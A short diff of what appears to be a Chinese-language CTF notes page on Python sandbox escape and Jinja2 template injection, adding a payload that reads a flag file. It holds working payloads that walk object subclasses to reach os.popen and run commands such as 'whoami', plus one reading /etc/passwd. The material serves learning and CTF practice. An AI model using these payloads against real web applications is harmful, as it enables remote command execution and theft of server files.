@@ -236,6 +236,8 @@ sys.stderr.write(sys.stderr.__class__('/etc/passwd').read())
 <pre><code>                                命令执行
 [].__class__.__base__.__subclasses__()[118].__init__.__globals__['popen']('whoami').read()
 [].__class__.__base__.__subclasses__()[185].__init__.__globals__['os'].popen('whoami').read()
+                                文件读取
+{{ config.__class__.__init__.__globals__['os'].popen('cat /flag | base64').read() }}
 </code></pre>
 <p>payload千变万化。思路都一样。只要获取到object对象，然后选一个能执行命令的模块，调用即可，比如eval，os等，都可以<br>
 寻找包含os模块的脚本</p>
